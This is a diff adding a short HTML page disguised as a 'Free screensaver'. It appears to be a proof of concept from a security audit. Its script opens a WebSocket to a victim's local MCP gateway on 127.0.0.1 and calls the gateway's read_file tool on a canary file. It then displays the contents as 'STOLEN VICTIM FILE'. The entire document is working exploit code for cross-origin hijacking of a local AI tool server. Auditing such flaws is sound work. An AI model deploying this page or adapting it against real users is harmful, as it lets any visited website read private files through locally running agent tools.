@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>totally-legit-page</title>
+</head><body><h1>Free screensaver</h1><pre id="out">connecting...
+UPGRADE ACCEPTED from page origin http://127.0.0.1:8089</pre>
+<script>
+const ws = new WebSocket('ws://127.0.0.1:18081/ws');   // victim's local supergateway
+const out = document.getElementById('out');
+const say = (s) => { out.textContent += '\n' + s; console.log(s); };
+ws.onopen = () => {
+  say('UPGRADE ACCEPTED from page origin ' + location.origin);
+  ws.send(JSON.stringify({jsonrpc:'2.0',id:1,method:'initialize',params:{protocolVersion:'2024-11-05',capabilities:{},clientInfo:{name:'evil-page',version:'1'}}}));
+};
+ws.onmessage = (ev) => {
+  const m = JSON.parse(ev.data);
+  if (m.id === 1) {
+    ws.send(JSON.stringify({jsonrpc:'2.0',method:'notifications/initialized'}));
+    ws.send(JSON.stringify({jsonrpc:'2.0',id:2,method:'tools/call',params:{name:'read_file',arguments:{path:'/home/kali/audit/canary.txt'}}}));
+  } else if (m.id === 2) {
+    const text = m.result.content[0].text.trim();
+    say('STOLEN VICTIM FILE: ' + text);
+    document.title = 'PWNED ' + text;
+  }
+};
+ws.onerror = () => say('ws error (server may require auth)');
+</script>
+</body></html>
